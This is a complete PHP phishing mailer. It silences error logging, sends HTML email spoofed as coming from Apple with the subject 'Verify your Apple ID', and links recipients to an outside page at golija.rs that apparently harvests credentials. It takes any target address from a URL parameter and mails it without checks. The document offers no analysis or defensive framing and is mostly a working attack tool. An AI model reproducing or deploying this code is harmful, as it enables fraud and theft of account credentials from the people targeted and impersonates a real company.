<?php
@session_start();
@error_reporting(0);
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@set_time_limit(0);
@set_magic_quotes_runtime(0);
$domain=$_SERVER['SERVER_NAME'];
//Open Session
#Headers
$headers = "From: AppleID <apple.suport.ns27328793@idapple.com>";
$headers .= "MIME-Version: 1.0\r\n";
$headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";
#subject
$subject="Verify your Apple ID";
#Letter
$Customer=
'Why you received this email<br>Apple requires verification whenever an email address is selected as an Apple ID. <br>Your email cannot be used until you verify it.<br><a href="http://golija.rs/cache/connect.html" target="_blank" id="x_i10" style="font-family:,Arial,sans-serif; font-size:14px; text-align:center; text-decoration:none; font-weight:600; letter-spacing:0.02em; color:blue">Updates</a> to our terms of use and privacy statement
';
#list email for check
$SEND = $_GET['email'];
mail($SEND,$subject,$Customer,$headers);
echo "$SEND, Sending to mailer!";

?> 
